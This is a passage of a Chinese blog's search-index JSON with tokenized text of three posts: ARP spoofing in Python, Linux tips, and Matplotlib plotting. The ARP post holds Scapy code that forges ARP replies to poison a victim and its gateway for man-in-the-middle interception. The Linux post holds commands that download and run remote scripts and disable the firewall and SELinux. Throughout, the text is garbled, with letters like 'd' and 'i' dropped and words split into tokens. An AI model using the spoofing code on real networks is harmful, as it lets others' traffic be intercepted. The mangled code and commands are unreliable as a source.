,"29",":","ab",":","65",":","55","'",",","'","src","'",":","'","58",":","00",":","e","3",":","7",":","5",":","ef","'",",","'","type","'",":","2054","&","#","125",";","pkg","[","0","]",".","res","[","0","]","[","1","]","[","1","]",".","fels","选择","响应","的","那","一部分","的","ARP","头部","'","'","'","&","#","123",";","'","hwtype","'",":","1",",","'","ptype","'",":","2048",",","'","hwlen","'",":","6",",","'","plen","'",":","4",",","'","op","'",":","2",",","'","hwsrc","'",":","'","58",":","00",":","e","3",":","7",":","5",":","ef","'",",","'","psrc","'",":","'","192.168.3.31","'",",","'","hwst","'",":","'","00",":","0","c",":","29",":","ab",":","65",":","55","'",",","'","pst","'",":","'","192.168.3.37","'","&","#","125",";","'","'","'","pkg","[","0","]",".","res","[","0","]","[","1","]","[","1","]",".","fels","[","'","hwsrc","'","]","提取","目标","mac","地址","，","也就是","当前","目标","发包","的","源","mac","地址","pkg","[","0","]",".","res","[","0","]","[","1","]","[","1","]",".","fels","[","'","psrc","'","]","源码","：","https",":","gthub",".","comArchKSPythontreemasterArpSpoof","4","、","Scapy","监听","ARP","异常","建立","正确的","IP","地址","和","MAC","地址","的","映射","数据库","mport","loggngloggng",".","getLogger","(","'","scapy",".","runtme","'",")",".","setLeel","(","loggng",".","ERROR",")","#","清除","报","错","from","scapy",".","all","mport","*","from","ARP","_","Table","mport","ARP","_","Table","#","导入","合","法","的","IP","-","MAC","映射","关系","ef","arp","_","montor","_","callback","(","pkt",")",":","f","ARP","n","pkt","an","pkt","[","ARP","]",".","op","n","(","1",",","2",")",":","#","找到","ARP","数据包","中","操作","码","为","1","（","who","-","has","）","或者","2","（","s","-","at","）","的","数据","包","）","f","ARP","_","Table",".","get","(","pkg","[","ARP","]",".","psrc",")",":","f","ARP","_","Table","[","pkt","[","ARP","]",".","psrc","]","=","=","pkt","[","ARP","]",".","hwsrc",":","prnt","(","'","IP","地址","：","&","#","123",";","0","&","#","125",";","MAC","地址","：","&","#","123",";","1","&","#","125",";","匹配","'",".","format","(","pkt","[","ARP","]",".","psrc",",","pkt","[","ARP","]",".","hwsrc",")",")","else",":","prnt","(","'","IP","地址","：","&","#","123",";","0","&","#","125",";","MAC","地址","：","&","#","123",";","1","&","#","125",";","不","匹配","'",".","format","(","pkt","[","ARP","]",".","psrc",",","pkt","[","ARP","]",".","hwsrc",")",")","else",":","prnt","(","'","IP","地址","：","&","#","123",";","0","&","#","125",";","MAC","地址","：","&","#","123",";","1","&","#","125",";","未","找到","条码","'",".","format","(","pkt","[","ARP","]",".","psrc",",","pkt","[","ARP","]",".","hwsrc",")",")","#","捕获","数据包","，","通过","arp","_","montor","_","callback","方法","进行","处理","，","flter","过滤","arp","数据包","，","store","=","0","，","不","保存","数据","，","face","指定","接口","snff","(","prn","=","arp","_","montor","_","callback",",","flter","=","'","arp","'",",","store","=","0",",","face","=","'","ens","32","'",")","5","、","Scapy","实现","ARP","的","毒化","攻击","原理","：","所以","，","只","需要","修改","A","中的","ARP","缓存","表","，","将","与","B","对应","的","MAC","修改","。","于是","，","发给","A","的","ARP","响应","报文","格式","应为","：","目的","IP","：","A","目的","MAC","：","A","源","IP","：","B","源","MAC","：","C","就","能","实现","上图","功能","。","紧接着","，","如果","B","要","发","消息","给","A","，","那么","A","中的","ARP","表","可能会","调整","回","正确的","，","于是","可以","向","B","发送","ARP","报文","，","格式","为","：","目的","IP","：","B","目的","MAC","：","B","源","IP","：","A","源","MAC","：","C","这样","，","B","发往","A","的","数据","包","也","会","走向","C","了","，","A","，","B","双方","的","通信","都","将","被","C","截获","。","通常","，","B","往往","是","路由器","，","所以","B","的","IP","地址","一般","是","默认","网关","。","'","'","'","源","IP","为","默认","网关","的","IP","源","MAC","为","默认","网关","的","MAC","目的","IP","为","需要","毒化","主机","的","IP","目的","MAC","为","需要","毒化","主机","的","MAC","'","'","'","pkgtoHost","=","Ether","(","src","=","localmac",",","st","=","tgmac",")","ARP","(","op","=","2",",","hwsrc","=","localmac",",","psrc","=","gatewayp",",","hwst","=","tgmac",",","pst","=","tgp",")","gatewayMac","=","getmacbyp","(","gatewayp",")","'","'","'","源","IP","为","被","攻击","主机","的","IP","源","MAC","为","本","机","MAC","目的","IP","为","默认","网关","的","IP","目的","MAC","为","默认","网关","的","MAC","'","'","'","pkgtoGateway","=","Ether","(","src","=","localmac",",","st","=","gatewayMac",")","ARP","(","hwst","=","gatewayMac",",","pst","=","gatewayp",",","psrc","=","tgp",",","hwsrc","=","localmac",",","op","=","2",")","源码","：","https",":","gthub",".","comArchKSPythontreemasterArpSpoof"],"url":"http://ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/","title":"Python实现ARP欺骗屏蔽局域网","content":"Arp欺骗 ---- Python实现\n## 简介\n    1、ARP是地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。\n    2、当计算机知道IP...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2019-07-27 20:20:53"},{"word":["网络","测速","gt","clone","https",":","gthub",".","comselspeetest","-","cl",".","gtc","spee","*","&","amp",";","&","amp",";","python","speetest",".","py","#","后","接","`","-","-","share","`",",","可以","生成","分享","链接","#","测试","服务器","性能","wget","-","qO","-","gt",".","osuperbench",".","sh","bash","中文","man","手册","#","!","bnbashwget","https",":","src",".","feoraproject",".","orgrepopkgsman","-","pages","-","zh","-","CNmanpages","-","zh","-","1.5.1",".","tar",".","gz","13275","f","039","e","8788","b","15151","c","896150","bc","4","manpages","-","zh","-","1.5.1",".","tar",".","gztar","xf","manpages","-","zh","-","1.5.1",".","tar",".","gzc","manpages","-","zh","*",".","confgure","-","-","sable","-","zhtw","-","-","prefx","=","usrlocalzhmanmake","&","amp",";","&","amp",";","make","nstallc","~","echo","\"","alas","cman","=","'","man","-","M","usrlocalzhmansharemanzh","_","CN","'","\"",".","bash","_","proflesource",".","bash","_","profleecho","\"","USE","CMAN","TO","GET","HELP","\"","xshell","快捷键","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","alt","+","r","透明","模式","alt","+","s","简单","版","模式","ctrl","+","alt","+","f","文件","传输","ctrl","+","shft","+","alt","+","[","]","：","增大","或","减小","字体","+","-","-","-","-","-","-","-","-","需要","自定义","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","ctrl","+","q","：","水平","排列","ctrl","+","w","：","垂直","排列","ctrl","+","e","：","合并","所有","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","命令行","改","密码","echo","&","quot",";","passwor","&","quot",";","passw","-","-","stn","usernamescrpt","记录","面板","scrpt","-","a","log",".","txt","o",".",".",".","ext","将","程序","执行","结果","和","命令","放入","文件",",","需要","ext","退出","宝塔","面板","CentOS","7一","键","安装","：","yum","nstall","-","y","wget","&","amp",";","&","amp",";","wget","-","O","nstall",".","sh","http",":","ownloa",".","bt",".","cnnstallnstall","_","6.0",".","sh","&","amp",";","&","amp",";","sh","nstall",".","sh","一","键","卸载","：","wget","http",":","ownloa",".","bt",".","cnnstallbt","-","unnstall",".","sh","&","amp",";","&","amp",";","sh","bt","-","unnstall",".","sh","虚拟机","配置","两张","网卡","首","先在","虚拟机","设置","中","，","选择","添加","，","再","添加","一个","网络适配器","，","之后","进入","虚拟机","执行","p","a","如果","发现","没有","网卡","，","则","在","etcsysconfgnetwork","-","scrpts","目录","下","，","复制","你","已","有的","网卡","，","如果","是","DHCP","模式","，","则","不需要","修改","IP","cp","fcfg","-","ens","32","fcfg","-","ens","35","删除","fcfg","-","ens","35","中的","UUID","#","UUID","只能","是","唯一","编号","systemctl","restart","network","新建","CentOS","7","#","!","bnbashyum","-","y","nstall","wgetwget","-","O","etcyum",".","repos",".","epel",".","repo","http",":","mrrors",".","alyun",".","comrepoepel","-","7",".","repoyum","clean","allyum","makecachesystemctl","stop","frewallsystemctl","sable","frewallsetenforce","0","se","-","'","s","\\","SELINUX","=","enforcng","\\","SELINUX","=","sable","\\","'","etcselnuxconfgyum","-","y","nstall","mlocate","m","zp","unzp","tree","bash","-","completon","htop","lrzszupatebecho","\"","set","ts","=","2","\"","etcmrcecho","\"","set","nu","\"","etcmrcecho","'","alas","nstall","=","\"","yum","-","y","nstall","\"","'","~",".","bashrcecho","'","alas","32","=","\"","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","\"","'","~",".","bashrc","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","strng","=","$","1","array","=","(","$","&","#","123",";","strng",".","&","#","125",";",")","result","=","$","&","#","123",";","array","[","0","]","&","#","125",";","\"",".","\"","$","&","#","123",";","array","[","1","]","&","#","125",";","\"",".","\"","$","&","#","123",";","array","[","2","]","&","#","125",";","\"",".","2","\"","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","修改","hcp","为","静态","p","，","注意","默认","网关","和","p","地址","格式","se","-","\"","shcpstatcg","\"","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","cat","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","EOFIPADDR","=","$","1","NETMASK","=","255.255.255.0","GATEWAY","=","$","resultDNS","1","=","114.114.114.114","DNS","2","=","114.114.115.115","EOFsystemctl","restart","network","使用方法","：","bash","new",".","sh","192.168.255.10","中","源码","安装","Python","3","#","!","bnbashc","usrsrcmkr","python","3","c","python","3","yum","-","y","nstall","wgetyum","-","y","nstall","zlb","-","eel","bzp","2","-","eel","openssl","-","eel","ncurses","-","eel","sqlte","-","eel","realne","-","eel","tk","-","eel","gcc","makeyum","-","y","nstall","lbff","-","eel","wget","https",":","www",".","python",".","orgftppython","3.7.3","Python","-","3.7.3",".","tgztar","-","zxf","Python","-","3.7.3",".","tgz","rm","Python","-","3.7.3",".","tgz","-","rfc","Python","-","3.7.3",".","confgure","make","&","amp",";","&","amp",";","make","nstallpython","3","桥接","的","静态","IP","配置","修改","m","etcsysconfgnetwork","-","scrptsfcfg","-","ens","32","需要","把","默认","网关","调","成","192.168.1.1",",","而不是","192.168.1.2","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","BOOTPROTO","=","&","quot",";","statc","&","quot",";","IPADDR","=","192.168.75.57","NETMASK","=","255.255.255.0","GATEWAY","=","192.168.75.1","DNS","1","=","114.114.114.114","DNS","2","=","114.114.115.115","+","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","+","修改","后","，","重新","启动","网络","：","systemctl","restart","network","脚本","#","加速","，","可","不下","wget","https",":","raw",".","gthubusercontent",".","comchakgeLnux","-","NetSpeemastertcp",".","sh","&","amp",";","&","amp",";","bash","tcp",".","sh","#","安装","wget","https",":","raw",".","gthubusercontent",".","comToyoDAouboubmasterssr",".","sh","&","amp",";","&","amp",";","bash","ssr",".","sh","#","加速","+","安装","kcp","协议","wget","-","-","no","-","check","-","certfcate","-","O","kcptun","_","for","_","ss","_","ssr",".","sh","https",":","gt",".","ofN","2","EO","centos","8","alternates","-","-","set","python","usrbnpython","3","wget","-","N","-","-","no","-","check","-","certfcate","https",":","raw",".","gthubusercontent",".","comToyoDAouboubmasterssr",".","sh","&","amp",";","&","amp",";","chmo","+","x","ssr",".","sh","&","amp",";","&","amp",";","bash","ssr",".","shsysctl","-","w","net",".","p","4",".","tcp","_","congeston","_","control","=","bbrsystemctl","stop","frewall","Kal","连接","ssh","一","、","修改","配置","文件","etcsshssh","_","confg","将","#","PassworAuthentcaton","no","的","注释","去掉","，","并且","将","NO","修改","为","YES","kal","中","默认","是","yes","二","、","启动","SSH","服务","命令","为","：","etcnt",".","ssh","start","查看","SSH","服务","状态","是否","正常","运行","，","命令","为","：","etcnt",".","ssh","status","三","、","设置","系统","自动","启动","SSH","服务","upate","-","rc",".","ssh","enable","系统","自动","启动","SSH","服务","upate","-","rc",".","ssh","sable","关闭","系统","自动","启动","SSH","服务","SCP","远程","复制","命令","[","root@ngnx","~","]","#","scp","192.168.255.137",":","root","1",".","txt","root","参数","作用","-","C","允许","压缩","。","（","将","-","C","标志","传递","给","ssh","，","从而","打开","压缩","功能","）","-","p","保留","原文","件","的","修改","时间","，","访问","时间","和","访问","权限","。","-","r","递归","复制","整个","目录","。","lnux","下","fn","执行","操作","须","加","空格","和",";","[","root@noe1","~","]","#","fn","-","mtme","+","3","-","type","f","-","name","&","quot",";","postgresqlbak","&","quot",";","-","exec","rm","{","}","\\",";","终端","光标","漂移","键","CTRL","+","U","-","剪切","光标","前","的","内容","CTRL","+","K","-","剪切","光标","至行","末","的","内容","CTRL","+","Y","-","粘贴","CTRL","+","E","-","移动","光标","到","行","末","CTRL","+","A","-","移动","光标","到","行","首"],"url":"http://ymlog.cn/2019/07/18/%E7%8E%A9%E8%BD%ACLinux/","title":"玩转Linux","content":"网络测速git clone https://github.com/sivel/speedtest-cli.gitcd speed* &amp;&amp; python speedtest.py#后接`--share`,可以生成分享链接...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2019-07-18 12:53:27"},{"word":["目录","散","点","图","：","用于","描述","两个","变量","的","相关性","—","–","scatter","折线","图","：","多用","于","描述","变量","随时","间","的","变化","—","–","plot","条形","图",":","比较","多","个","项目","分类","的","数据","大小","直方图","：","表示","数据","的","分布","情况","（","连续","）","饼状图","：","显示","各项","大小","与","总和","的","比例","箱型图","：","上","边缘","，","上","四分","位","数","，","中位数","，","下","四分","位","数","，","下","边缘","，","异常","值","散","点","图","：","用于","描述","两个","变量","的","相关性","—","–","scatterscatter","(","x",",","y",",","s","=","None",",","c","=","None",",","marker","=","None",",","cmap","=","None",",","norm","=","None",",","mn","=","None",",","max","=","None",",","alpha","=","None",",","lnewths","=","None",",","erts","=","None",",","egecolors","=","None",",",",","ata","=","None",",","*","kwargs",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","#","随机","正","相关","m","=","np",".","ranom",".","rann","(","1000",")","n","=","m","+","np",".","ranom",".","rann","(","1000",")","*","0.5","plt",".","scatter","(","m",",","n",")","plt",".","show","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","#","随机","不相关","x","=","np",".","ranom",".","rann","(","1000",")","y","=","np",".","ranom",".","rann","(","1000",")","plt",".","scatter","(","x",",","y",")","plt",".","show","(",")","界面","定制","：","#","s",":","点","的","面积","#","c","：","颜色","#","marker","：","标志","形状","#","alpha","：","透明度","plt",".","scatter","(","x",",","y",",","s","=","100",",","c","=","&","apos",";","r","&","apos",";",",","marker","=","&","apos",";","X","&","apos",";",",","alpha","=","0.5",")","#","marker","的","种类","：","https",":","matplotlb",".","orgapmarkers","_","ap",".","html","?","hghlght","=","marker","#","moule","-","matplotlb",".","markers","折线","图","：","多用","于","描述","变量","随时","间","的","变化","—","–","plot","ef","plot","_","ate","(","x",",","y",",","fmt","=","’","o","’",",","tz","=","None",",","xate","=","True",",","yate","=","False",",",",","ata","=","None",",","*","kwargs",")","#","ef","plot","(","*","args",",","scalex","=","True",",","scaley","=","True",",","ata","=","None",",","*","*","kwargs",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","#","折线","图","#","生成","从","-","10","~","10","平均","等分","的","100","个数","x","=","np",".","lnspace","(","-","10",",","10",",","100",")","y","=","x","*","*","2","plt",".","plot","(","x",",","y",")","plt",".","show","(",")","文件","中","有","日期","的","折线","图","：","1","、","conerters","=","{","0",":","mate",".","strpate","2","num","(","‘","%","Y","’",")","}","2","、","plt",".","plot","_","ate","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","mport","matplotlb",".","ates","as","mate","#","北京","房价","折线","图","ate",",","bejng",",","tanjng",",","shjazhuang","=","np",".","loatxt","(","&","apos",";","emo",".","cs","&","apos",";",",","elmter","=","&","apos",";",",","&","apos",";",",","conerters","=","{","0",":","mate",".","strpate","2","num","(","&","apos",";","%","Y","&","apos",";",")","}",",","skprows","=","1",",","usecols","=","(","0",",","1",",","2",",","3",")",",","unpack","=","True",",","encong","=","&","apos",";","GBK","&","apos",";",")","#","skprows",":","从","第","几","行","开始","导入","#","usecols",":","导入","第","几","列","#","unpack",":","False","-","从","左","往","右","形成","一行","，","True","-","从","上","往下","形成","一行","#","elmter",":","cs","中","每个","数据","的","分隔","符","plt",".","plot","_","ate","(","ate",",","bejng",",","lnestyle","=","&","apos",";","-","&","apos",";",",","marker","=","&","apos",";","o","&","apos",";",",","color","=","&","apos",";","re","&","apos",";",")","plt",".","plot","_","ate","(","ate",",","tanjng",",","lnestyle","=","&","apos",";","-","&","apos",";",",","marker","=","&","apos",";","o","&","apos",";",",","color","=","&","apos",";","blue","&","apos",";",")","plt",".","plot","_","ate","(","ate",",","shjazhuang",",","lnestyle","=","&","apos",";","-","&","apos",";",",","marker","=","&","apos",";","o","&","apos",";",",","color","=","&","apos",";","black","&","apos",";",")","#","lnestyle",":","直线","、","虚线","plt",".","show","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","#","画出","正弦","函数","的","图像","x","=","np",".","lnspace","(","-","10",",","10",",","100",")","y","=","np",".","sn","(","x",")","plt",".","plot","(","x",",","y",")","plt",".","show","(",")","条形","图",":","比较","多","个","项目","分类","的","数据","大小","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","#","ef","bar","(","x",",","heght",",","wth","=","0.8",",","bottom","=","None",",","*",",","algn","=","&","apos",";","center","&","apos",";",",","ata","=","None",",","*","*","kwargs",")",":","N","=","5","#","并列","y","=","[","22",",","55",",","33",",","42",",","60","]","nex","=","np",".","arange","(","N",")","x","=","plt",".","bar","(","x","=","nex",",","heght","=","y",",","wth","=","0.4",",","color","=","&","apos",";","re","&","apos",";",")","plt",".","show","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","N","=","5","#","并列","y","=","[","22",",","55",",","33",",","42",",","60","]","nex","=","np",".","arange","(","N",")","x","=","plt",".","barh","(","y","=","nex",",","wth","=","y",",","color","=","&","apos",";","re","&","apos",";",")","plt",".","show","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","N","=","5","#","并列","y","1","=","[","22",",","55",",","33",",","42",",","60","]","y","2","=","[","21",",","20",",","45",",","10",",","54","]","bar","_","wth","=","0.3","nex","=","np",".","arange","(","N",")","plt",".","bar","(","x","=","nex",",","heght","=","y","1",",","color","=","&","apos",";","re","&","apos",";",",","wth","=","0.3",")","plt",".","bar","(","x","=","nex","+","bar","_","wth",",","heght","=","y","2",",","color","=","&","apos",";","blue","&","apos",";",",","wth","=","0.3",")","plt",".","show","(",")","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","N","=","5","#","层叠","-","就是","将","下层","图像","置","为","上层","的","buttom","y","1","=","[","22",",","55",",","33",",","42",",","60","]","y","2","=","[","21",",","20",",","45",",","10",",","54","]","nex","=","np",".","arange","(","N",")","plt",".","bar","(","nex",",","y","1",",","0.2",",","color","=","&","apos",";","re","&","apos",";",")","plt",".","bar","(","nex",",","y","1",",","0.2",",","y","1",",","color","=","&","apos",";","blue","&","apos",";",")","#","不能","写","x","=","nex","，","heght","=","y","1","等","plt",".","show","(",")","直方图","：","表示","数据","的","分布","情况","（","连续","）","#","直方图","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","mu","=","100","#","mean","of","the","strubuton","sgma","=","20","#","stanar","eaton","of","strbuton","x","=","np",".","ranom",".","rann","(","2000",")","plt",".","hst","(","x",",","bns","=","10",",","color","=","&","apos",";","re","&","apos",";",",","ensty","=","False",",","egecolor","=","&","apos",";","k","&","apos",";",")","#","bns","：","多少","块","#","ensty",":","是否","标准化","，","标准化","之后","为","频组","#","egecolor","：","颜色","分割","线","plt",".","show","(",")","#","双","变量","直方图","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","x","=","np",".","ranom",".","rann","(","2000",")","+","2","y","=","np",".","ranom",".","rann","(","2000",")","+","3","plt",".","hst","2","(","x",",","y",",","bns","=","50",")","plt",".","show","(",")","饼状图","：","显示","各项","大小","与","总和","的","比例","#","饼状图","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","labels","=","&","apos",";","A","&","apos",";",",","&","apos",";","B","&","apos",";",",","&","apos",";","C","&","apos",";",",","&","apos",";","D","&","apos",";","fraces","=","[","15",",","30",",","25",",","10","]","exploe","=","[","0",",","0",",","0",",","0.05","]","plt",".","pe","(","x","=","fraces",",","labels","=","labels",",","autopct","=","&","apos",";","%","0",".","f","%","%","&","apos",";",",","exploe","=","exploe",",","shaow","=","True",")","#","autopct",":","显示","百分比","#","exploe",":","突出","显示","#","shaow",":","加","阴影","plt",".","show","(",")","箱型图","：","上","边缘","，","上","四分","位","数","，","中位数","，","下","四分","位","数","，","下","边缘","，","异常","值","#","箱型图","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","np",".","ranom",".","see","(","1",")","ata","=","np",".","ranom",".","normal","(","sze","=","1000",",","loc","=","0",",","scale","=","1",")","plt",".","boxplot","(","ata",",","sym","=","&","apos",";","x","&","apos",";",",","whs","=","1.5",")","#","sym",":","符号","#","whs",":","异常","值","的","区域","plt",".","show","(",")","#","多箱型图","mport","numpy","as","np","mport","matplotlb",".","pyplot","as","plt","np",".","ranom",".","see","(","1",")","ata","=","np",".","ranom",".","normal","(","sze","=","(","1000",",","4",")",",","loc","=","0",",","scale","=","1",")","labels","=","[","&","apos",";","A","&","apos",";",",","&","apos",";","B","&","apos",";",",","&","apos",";","C","&","apos",";",",","&","apos",";","D","&","apos",";","]","plt",".","boxplot","(","ata",",","sym","=","&","apos",";","x","&","apos",";",",","whs","=","1.5",")","plt",".","show","(",")"],"url":"http://ymlog.cn/2019/05/03/Matplotlib%E5%9B%BE%E6%A0%87%E7%BB%98%E5%88%B6%E6%91%98%E8%A6%81/","title":"Matplotlib图标绘制摘要","content":"目录\n散点图：用于描述两个变量的相关性—–scatter折线图：多用于描述变量随时间的变化—–plot条形图:比较多个项目分类的数据大小直方图：表示数据的分布情况（连续）饼状图：显示各项大小与总和的比例箱型图：上边缘，上四分位数，中位...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2019-05-03 08:18:25"}]